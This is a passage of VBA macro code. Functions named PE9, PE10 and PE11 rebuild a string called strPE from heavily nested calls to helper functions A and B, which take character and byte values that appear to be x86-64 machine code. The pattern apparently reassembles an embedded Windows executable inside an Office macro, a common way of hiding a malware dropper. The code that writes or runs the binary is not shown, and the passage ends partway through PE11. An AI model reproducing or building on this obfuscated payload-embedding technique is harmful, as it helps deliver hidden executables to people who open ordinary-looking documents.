    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "VSHcY"), 20), 137), 213), "I"), 137), 202), "A"), 137), 209), 193), 253), 5), "9"), 235), "~"), 127), "L"), 141), "a"), 24), "Hc"), 237), "M"), 141), 28), 156), "I"), 141), "4"), 172), "A"), 131), 225), 31), 15), 132), "~"), 0), 0), 0), 139), 6), "D"), 137)
    strPE = A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 201), 191), " "), 0), 0), 0), "H"), 141), "V"), 4), "D)"), 207), 211), 232), "A"), 137), 192), "I9"), 211), 15), 134), 151), 0), 0), 0), "L"), 137), 230), 15), 31), "@"), 0), 139), 2), 137), 249), "H"), 131), 198), 4), "H"), 131), 194), 4), 211), 224), "D"), 137)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(strPE, 201), "D"), 9), 192), 137), "F"), 252), "D"), 139), "B"), 252), "A"), 211), 232), "I9"), 211), "w"), 221), "H)"), 235), "I"), 141), "D"), 156), 252), "D"), 137), 0), "E"), 133), 192), "tBH"), 131), 192), 4), 235), "<"), 15), 31), 128), 0), 0), 0), 0), "A"), 199)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "B"), 20), 0), 0), 0), 0), "A"), 199), "B"), 24), 0), 0), 0), 0), "[^_]A\"), 195), 144), "L"), 137), 231), "I9"), 243), "v"), 224), 15), 31), 132), 0), 0), 0), 0), 0), 165), "I9"), 243), "w"), 250), "H)"), 235), "I"), 141), 4)
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 156), "L)"), 224), "H"), 193), 248), 2), "A"), 137), "B"), 20), 133), 192), "t"), 196), "[^_]A\"), 195), 15), 31), "D"), 0), 0), "A"), 137), "B"), 24), 133), 192), "t"), 168), "L"), 137), 224), 235), 150), "ff."), 15), 31), 132), 0), 0), 0)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 0), 0), "E1"), 192), "HcQ"), 20), "H"), 141), "A"), 24), "H"), 141), 12), 144), "H9"), 200), "r"), 25), 235), ")f."), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 131), 192), 4), "A"), 131), 192), " H9"), 193), "v"), 18), 139), 16), 133)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(strPE, 210), "t"), 237), "H9"), 193), "v"), 7), 243), 15), 188), 210), "A"), 1), 208), "D"), 137), 192), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "VSH"), 131), 236), "("), 139), 5), 148), "o"), 0), 0), 137), 206), 131), 248), 2), "t")
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(strPE, "{"), 133), 192), "t9"), 131), 248), 1), "u#H"), 139), 29), 13), "w"), 0), 0), 15), 31), "D"), 0), 0), 185), 1), 0), 0), 0), 255), 211), 139), 5), "ko"), 0), 0), 131), 248), 1), "t"), 238), 131), 248), 2), "tOH"), 131), 196), "([")

    PE9 = strPE
End Function

Private Function PE10() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "^"), 195), "f."), 15), 31), 132), 0), 0), 0), 0), 0), 184), 1), 0), 0), 0), 135), 5), "Eo"), 0), 0), 133), 192), "uQH"), 139), 29), 162), "v"), 0), 0), "H"), 141), 13), "Co"), 0), 0), 255), 211), "H"), 141), 13), "bo"), 0), 0)
    strPE = A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 255), 211), "H"), 141), 13), "a"), 0), 0), 0), 232), 12), 169), 255), 255), 199), 5), 18), "o"), 0), 0), 2), 0), 0), 0), "Hc"), 206), "H"), 141), 5), 24), "o"), 0), 0), "H"), 141), 20), 137), "H"), 141), 12), 208), "H"), 131), 196), "([^H"), 255)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "%#v"), 0), 0), 15), 31), 0), 131), 248), 2), "t"), 27), 139), 5), 229), "n"), 0), 0), 131), 248), 1), 15), 132), "X"), 255), 255), 255), 233), "q"), 255), 255), 255), 15), 31), 128), 0), 0), 0), 0), 199), 5), 198), "n"), 0), 0), 2), 0), 0), 0)
    strPE = B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 235), 178), 15), 31), "@"), 0), "SH"), 131), 236), " "), 184), 3), 0), 0), 0), 135), 5), 176), "n"), 0), 0), 131), 248), 2), "t"), 11), "H"), 131), 196), " ["), 195), 15), 31), "D"), 0), 0), "H"), 139), 29), 193), "u"), 0), 0), "H"), 141), 13), 162), "n")
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(strPE, 0), 0), 255), 211), "H"), 141), 13), 193), "n"), 0), 0), "H"), 137), 216), "H"), 131), 196), " [H"), 255), 224), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), 0), "VSH"), 131), 236), "8"), 137), 203), "1"), 201), 232), 193), 254), 255)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 255), 131), 251), 9), "~L"), 137), 217), 190), 1), 0), 0), 0), 211), 230), "Hc"), 198), "H"), 141), 12), 133), "#"), 0), 0), 0), "H"), 184), 248), 255), 255), 255), 7), 0), 0), 0), "H!"), 193), 232), ">"), 12), 0), 0), "H"), 133), 192), "t"), 23), 131)
    strPE = B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "=*n"), 0), 0), 2), 137), "X"), 8), 137), "p"), 12), "t5H"), 199), "@"), 16), 0), 0), 0), 0), "H"), 131), 196), "8[^"), 195), 15), 31), 0), "H"), 141), 21), 185), "m"), 0), 0), "Hc"), 203), "H"), 139), 4), 202), "H"), 133), 192), "t")
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(strPE, "-L"), 139), 0), 131), "="), 243), "m"), 0), 0), 2), "L"), 137), 4), 202), "u"), 203), "H"), 137), "D$(H"), 141), 13), 241), "m"), 0), 0), 255), 21), "Su"), 0), 0), "H"), 139), "D$("), 235), 178), 15), 31), "@"), 0), 137), 217), 190), 1)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 0), "H"), 139), 5), "2#"), 0), 0), "L"), 141), 5), "kd"), 0), 0), 211), 230), "Hc"), 214), "H"), 137), 193), "H"), 141), 20), 149), "#"), 0), 0), 0), "L)"), 193), "H"), 193), 234), 3), "H"), 193), 249), 3), 137), 210), "H"), 1), 209), "H")
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 129), 249), " "), 1), 0), 0), 15), 135), "2"), 255), 255), 255), "H"), 141), 20), 208), "H"), 137), 21), 243), 34), 0), 0), 233), "M"), 255), 255), 255), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), 0), "ATH"), 131), 236), " I"), 137)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(strPE, 204), "H"), 133), 201), "t:"), 131), "y"), 8), 9), "~"), 12), "H"), 131), 196), " A\"), 233), "q"), 11), 0), 0), 144), "1"), 201), 232), 169), 253), 255), 255), "IcT$"), 8), "H"), 141), 5), 237), "l"), 0), 0), 131), "=6m"), 0), 0), 2)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(strPE, "H"), 139), 12), 208), "L"), 137), "$"), 208), "I"), 137), 12), "$t"), 8), "H"), 131), 196), " A\"), 195), 144), "H"), 141), 13), ")m"), 0), 0), "H"), 131), 196), " A\H"), 255), "%"), 132), "t"), 0), 0), "ff."), 15), 31), 132), 0), 0)
    strPE = A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 144), "AUATVSH"), 131), 236), "("), 139), "q"), 20), "I"), 137), 204), "Ic"), 216), "Hc"), 202), "1"), 210), 15), 31), 132), 0), 0), 0), 0), 0), "A"), 139), "D"), 148), 24), "H"), 15), 175), 193), "H"), 1), 216), "A"), 137)
    strPE = B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "D"), 148), 24), "H"), 137), 195), "H"), 131), 194), 1), "H"), 193), 235), " 9"), 214), 127), 224), "M"), 137), 229), "H"), 133), 219), "t"), 26), "A9t$"), 12), "~!Hc"), 198), 131), 198), 1), "M"), 137), 229), "A"), 137), "\"), 132), 24), "A"), 137), "t")
    strPE = B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(strPE, "$"), 20), "L"), 137), 232), "H"), 131), 196), "([^A\A]"), 195), "A"), 139), "D$"), 8), 141), "H"), 1), 232), 19), 254), 255), 255), "I"), 137), 197), "H"), 133), 192), "t"), 221), "H"), 141), "H"), 16), "IcD$"), 20), "I"), 141), "T$")
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 16), "L"), 141), 4), 133), 8), 0), 0), 0), 232), "`"), 10), 0), 0), "L"), 137), 225), "M"), 137), 236), 232), 229), 254), 255), 255), 235), 162), 15), 31), 0), "SH"), 131), 236), "0"), 137), 203), "1"), 201), 232), 162), 252), 255), 255), "H"), 139), 5), 243), "k"), 0)
    strPE = A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(strPE, 0), "H"), 133), 192), "t.H"), 139), 16), 131), "=,l"), 0), 0), 2), "H"), 137), 21), 221), "k"), 0), 0), "tf"), 137), "X"), 24), "H"), 187), 0), 0), 0), 0), 1), 0), 0), 0), "H"), 137), "X"), 16), "H"), 131), 196), "0["), 195), 15), 31)
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "@"), 0), "H"), 139), 5), "q!"), 0), 0), "H"), 141), 13), 170), "b"), 0), 0), "H"), 137), 194), "H)"), 202), "H"), 193), 250), 3), "H"), 131), 194), 5), "H"), 129), 250), " "), 1), 0), 0), "vC"), 185), "("), 0), 0), 0), 232), 225), 9), 0), 0), "H")
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 133), 192), "t"), 194), "H"), 186), 1), 0), 0), 0), 2), 0), 0), 0), 131), "="), 195), "k"), 0), 0), 2), "H"), 137), "P"), 8), "u"), 154), "H"), 137), "D$(H"), 141), 13), 193), "k"), 0), 0), 255), 21), "#s"), 0), 0), "H"), 139), "D$(")
    strPE = B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(strPE, 235), 129), 15), 31), "@"), 0), "H"), 141), "P(H"), 137), 21), 5), "!"), 0), 0), 235), 191), 15), 31), 0), "AWAVAUATUWVSH"), 131), 236), "(Hci"), 20), "Hcz"), 20), "I"), 137), 205), "I")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(strPE, 137), 215), "9"), 253), "|"), 14), 137), 248), "I"), 137), 207), "Hc"), 253), "I"), 137), 213), "Hc"), 232), "1"), 201), 141), 28), "/A9_"), 12), 15), 156), 193), "A"), 3), "O"), 8), 232), 219), 252), 255), 255), "I"), 137), 196), "H"), 133), 192), 15), 132), 244)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(strPE, 0), 0), 0), "L"), 141), "X"), 24), "Hc"), 195), "I"), 141), "4"), 131), "I9"), 243), "s#H"), 137), 240), "L"), 137), 217), "1"), 210), "L)"), 224), "H"), 131), 232), 25), "H"), 193), 232), 2), "L"), 141), 4), 133), 4), 0), 0), 0), 232), 7), 9), 0)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 0), "I"), 137), 195), "M"), 141), "M"), 24), "M"), 141), "w"), 24), "I"), 141), ","), 169), "I"), 141), "<"), 190), "I9"), 233), 15), 131), 134), 0), 0), 0), "H"), 137), 248), "L)"), 248), "I"), 131), 199), 25), "H"), 131), 232), 25), "H"), 193), 232), 2), "L9"), 255)
    strPE = B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "L"), 141), ","), 133), 4), 0), 0), 0), 184), 4), 0), 0), 0), "L"), 15), "B"), 232), 235), 12), 15), 31), 0), "I"), 131), 195), 4), "L9"), 205), "vRE"), 139), 17), "I"), 131), 193), 4), "E"), 133), 210), "t"), 235), "L"), 137), 217), "L"), 137), 242), "E")
    strPE = A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "1"), 192), "f."), 15), 31), 132), 0), 0), 0), 0), 0), 139), 2), "D"), 139), "9H"), 131), 194), 4), "H"), 131), 193), 4), "I"), 15), 175), 194), "L"), 1), 248), "L"), 1), 192), "I"), 137), 192), 137), "A"), 252), "I"), 193), 232), " H9"), 215), "w"), 218)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "G"), 137), 4), "+I"), 131), 195), 4), "L9"), 205), "w"), 174), 133), 219), 127), 14), 235), 23), 15), 31), 128), 0), 0), 0), 0), 131), 235), 1), "t"), 11), 139), "F"), 252), "H"), 131), 238), 4), 133), 192), "t"), 240), "A"), 137), "\$"), 20), "L"), 137), 224)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "H"), 131), 196), "([^_]A\A]A^A_"), 195), 15), 31), 128), 0), 0), 0), 0), "AVAUATUWVSH"), 131), 236), " "), 137), 208), "I"), 137), 205), 137), 211), 131), 224), 3), 15), 133)
    strPE = A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(strPE, ":"), 1), 0), 0), 193), 251), 2), "M"), 137), 236), "tuH"), 139), "="), 147), "`"), 0), 0), "H"), 133), 255), 15), 132), "R"), 1), 0), 0), "M"), 137), 236), "L"), 139), "-hq"), 0), 0), "H"), 141), "-"), 153), "i"), 0), 0), "M"), 137), 238), 235), 19)
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 15), 31), "@"), 0), 209), 251), "tGH"), 139), "7H"), 133), 246), "tTH"), 137), 247), 246), 195), 1), "t"), 236), "H"), 137), 250), "L"), 137), 225), 232), "1"), 254), 255), 255), "H"), 137), 198), "H"), 133), 192), 15), 132), 5), 1), 0), 0), "M"), 133), 228)
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 15), 132), 156), 0), 0), 0), "A"), 131), "|$"), 8), 9), "~TL"), 137), 225), "I"), 137), 244), 232), 185), 7), 0), 0), 209), 251), "u"), 185), "L"), 137), 224), "H"), 131), 196), " [^_]A\A]A^"), 195), 15), 31), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 185), 1), 0), 0), 0), 232), 214), 249), 255), 255), "H"), 139), "7H"), 133), 246), "tn"), 131), "=gi"), 0), 0), 2), "u"), 145), "H"), 141), 13), 150), "i"), 0), 0), "A"), 255), 214), 235), 133), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "1"), 201)
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 232), 169), 249), 255), 255), "IcD$"), 8), 131), "==i"), 0), 0), 2), "H"), 139), "T"), 197), 0), "L"), 137), "d"), 197), 0), "I"), 137), 20), "$I"), 137), 244), 15), 133), "F"), 255), 255), 255), "H"), 141), 13), "/i"), 0), 0), "A"), 255), 213)
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 233), "7"), 255), 255), 255), 15), 31), 128), 0), 0), 0), 0), "I"), 137), 196), 233), "("), 255), 255), 255), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 137), 250), "H"), 137), 249), 232), "e"), 253), 255), 255), "H"), 137), 7), "H"), 137), 198), "H"), 133), 192), "t:")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "H"), 199), 0), 0), 0), 0), 0), 233), "p"), 255), 255), 255), "f"), 15), 31), "D"), 0), 0), 131), 232), 1), "H"), 141), 21), 222), "4"), 0), 0), "E1"), 192), "H"), 152), 139), 20), 130), 232), 193), 251), 255), 255), "I"), 137), 197), "H"), 133), 192), 15), 133), 163)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 254), 255), 255), 15), 31), "D"), 0), 0), "E1"), 228), 233), 19), 255), 255), 255), 185), 1), 0), 0), 0), 232), 254), 248), 255), 255), "H"), 139), "='_"), 0), 0), "H"), 133), 255), "t"), 31), 131), "="), 139), "h"), 0), 0), 2), 15), 133), 139), 254), 255)
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(strPE, 255), "H"), 141), 13), 182), "h"), 0), 0), 255), 21), 240), "o"), 0), 0), 233), "y"), 254), 255), 255), 185), 1), 0), 0), 0), 232), 249), 249), 255), 255), "H"), 137), 199), "H"), 133), 192), "t"), 30), "H"), 184), 1), 0), 0), 0), "q"), 2), 0), 0), "H"), 137), "=")
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 224), "^"), 0), 0), "H"), 137), "G"), 20), "H"), 199), 7), 0), 0), 0), 0), 235), 177), "H"), 199), 5), 200), "^"), 0), 0), 0), 0), 0), 0), "E1"), 228), 233), 155), 254), 255), 255), "AVAUATUWVSH"), 131), 236), " ")
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(strPE, "I"), 137), 204), 137), 214), 139), "I"), 8), 137), 211), "A"), 139), "l$"), 20), 193), 254), 5), "A"), 139), "D$"), 12), 1), 245), "D"), 141), "m"), 1), "A9"), 197), "~"), 10), 1), 192), 131), 193), 1), "A9"), 197), 127), 246), 232), 129), 249), 255), 255), "I")
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 137), 198), "H"), 133), 192), 15), 132), 162), 0), 0), 0), "H"), 141), "x"), 24), 133), 246), "~"), 23), "Hc"), 246), "H"), 137), 249), "1"), 210), "H"), 193), 230), 2), "I"), 137), 240), "H"), 1), 247), 232), 190), 5), 0), 0), "IcD$"), 20), "I"), 141), "t")
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "$"), 24), "L"), 141), 12), 134), 131), 227), 31), 15), 132), 127), 0), 0), 0), "A"), 186), " "), 0), 0), 0), "I"), 137), 248), "1"), 210), "A)"), 218), 144), 139), 6), 137), 217), "I"), 131), 192), 4), "H"), 131), 198), 4), 211), 224), "D"), 137), 209), 9), 208), "A")
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(strPE, 137), "@"), 252), 139), "V"), 252), 211), 234), "I9"), 241), "w"), 223), "L"), 137), 200), "I"), 141), "L$"), 25), "L)"), 224), "H"), 131), 232), 25), "H"), 193), 232), 2), "I9"), 201), 185), 4), 0), 0), 0), "H"), 141), 4), 133), 4), 0), 0), 0), "H"), 15)
    strPE = B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(strPE, "B"), 193), 133), 210), "A"), 15), "E"), 237), 137), 20), 7), "A"), 137), "n"), 20), "L"), 137), 225), 232), 211), 249), 255), 255), "L"), 137), 240), "H"), 131), 196), " [^_]A\A]A^"), 195), 144), 165), "I9"), 241), "v"), 219), 165), "I")
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(strPE, "9"), 241), "w"), 244), 235), 211), "f"), 144), "HcB"), 20), "D"), 139), "A"), 20), "I"), 137), 209), "A)"), 192), "u<H"), 141), 20), 133), 0), 0), 0), 0), "H"), 131), 193), 24), "H"), 141), 4), 17), "I"), 141), "T"), 17), 24), 235), 14), "f"), 15), 31)
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 132), 0), 0), 0), 0), 0), "H9"), 193), "s"), 23), "H"), 131), 232), 4), "H"), 131), 234), 4), "D"), 139), 18), "D9"), 16), "t"), 235), "E"), 25), 192), "A"), 131), 200), 1), "D"), 137), 192), 195), "ATUWVSH"), 131), 236), " Hc")
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(strPE, "B"), 20), 139), "y"), 20), "H"), 137), 206), "H"), 137), 211), ")"), 199), 15), 133), "a"), 1), 0), 0), "H"), 141), 20), 133), 0), 0), 0), 0), "H"), 141), "I"), 24), "H"), 141), 4), 17), "H"), 141), "T"), 19), 24), 235), 19), "f."), 15), 31), 132), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "H9"), 193), 15), 131), "W"), 1), 0), 0), "H"), 131), 232), 4), "H"), 131), 234), 4), "D"), 139), 26), "D9"), 24), "t"), 231), 15), 130), ","), 1), 0), 0), 139), "N"), 8), 232), 249), 247), 255), 255), "I"), 137), 192), "H"), 133), 192), 15), 132), 248)
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 137), "x"), 16), "HcF"), 20), "H"), 141), "n"), 24), "M"), 141), "`"), 24), 185), 24), 0), 0), 0), "1"), 210), "I"), 137), 193), "L"), 141), "\"), 133), 0), "HcC"), 20), "H"), 141), "|"), 131), 24), "f"), 15), 31), "D"), 0), 0), 139), 4)
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(strPE, 14), "H)"), 208), 139), 20), 11), "H)"), 208), "A"), 137), 4), 8), "H"), 137), 194), "H"), 131), 193), 4), "A"), 137), 194), "H"), 193), 234), " H"), 141), 4), 25), 131), 226), 1), "H9"), 199), "w"), 214), "H"), 137), 248), "H"), 141), "s"), 25), "H)"), 216)
    strPE = A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 187), 0), 0), 0), 0), "H"), 131), 232), 25), "H"), 137), 193), "H"), 131), 224), 252), "H"), 193), 233), 2), "H9"), 247), "H"), 15), "B"), 195), "H"), 141), 12), 141), 4), 0), 0), 0), 187), 4), 0), 0), 0), "L"), 1), 224), "H9"), 247), "H"), 15), "B"), 203)

    PE10 = strPE
End Function

Private Function PE11() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(strPE, "H"), 1), 205), "I"), 1), 204), "I9"), 235), "v?L"), 137), 227), "H"), 137), 233), "f"), 15), 31), 132), 0), 0), 0), 0), 0), 139), 1), "H"), 131), 193), 4), "H"), 131), 195), 4), "H)"), 208), "H"), 137), 194), 137), "C"), 252), "A"), 137), 194), "H"), 193)
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(strPE, 234), " "), 131), 226), 1), "I9"), 203), "w"), 222), "I"), 141), "C"), 255), "H)"), 232), "H"), 131), 224), 252), "L"), 1), 224), "E"), 133), 210), "u"), 18), 15), 31), 0), 139), "P"), 252), "H"), 131), 232), 4), "A"), 131), 233), 1), 133), 210), "t"), 241), "E"), 137), "H")
